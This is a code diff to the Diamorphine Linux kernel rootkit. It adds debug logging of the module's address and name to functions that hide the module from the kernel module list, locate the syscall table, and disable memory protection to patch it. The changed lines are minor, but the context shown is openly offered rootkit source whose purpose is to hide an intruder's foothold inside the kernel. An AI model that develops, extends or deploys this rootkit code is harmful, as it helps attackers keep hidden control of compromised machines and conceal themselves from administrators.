@@ -1,9 +1,9 @@
+#include <linux/dirent.h>
 #include <linux/module.h>
 #include <linux/sched.h>
 #include <linux/slab.h>
 #include <linux/syscalls.h>
 #include <linux/version.h>
-#include <linux/dirent.h>
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
 #include <asm/uaccess.h>
@@ -440,6 +440,7 @@ static short module_hidden = 0;
 void module_show(void) {
   LOG_FUNC_ENTRY();
   LOG_INFO("Making module visible in module list");
+  LOG_DEBUG("Module address: %p, name: %s", THIS_MODULE, THIS_MODULE->name);
   if (module_hidden) {
     LOG_DEBUG("Adding module back to module list at position: %p",
               module_previous);
@@ -455,6 +456,7 @@ void module_show(void) {
 void module_hide(void) {
   LOG_FUNC_ENTRY();
   LOG_INFO("Hiding module from module list");
+  LOG_DEBUG("Module address: %p, name: %s", THIS_MODULE, THIS_MODULE->name);
   if (!module_hidden) {
     module_previous = THIS_MODULE->list.prev;
     LOG_DEBUG("Stored previous module position: %p", module_previous);
@@ -591,6 +593,7 @@ static inline void unprotect_memory(void) {
 static int __init diamorphine_init(void) {
   LOG_FUNC_ENTRY();
   LOG_INFO("Initializing Diamorphine rootkit module");
+  LOG_DEBUG("Module address: %p, name: %s", THIS_MODULE, THIS_MODULE->name);
 
   LOG_DEBUG("Attempting to locate syscall table");
   __sys_call_table = get_syscall_table_bf();
@@ -677,6 +680,7 @@ static int __init diamorphine_init(void) {
 static void __exit diamorphine_cleanup(void) {
   LOG_FUNC_ENTRY();
   LOG_INFO("Cleaning up Diamorphine rootkit module");
+  LOG_DEBUG("Module address: %p, name: %s", THIS_MODULE, THIS_MODULE->name);
 
   LOG_DEBUG("Disabling memory protection to restore syscall table");
   unprotect_memory();
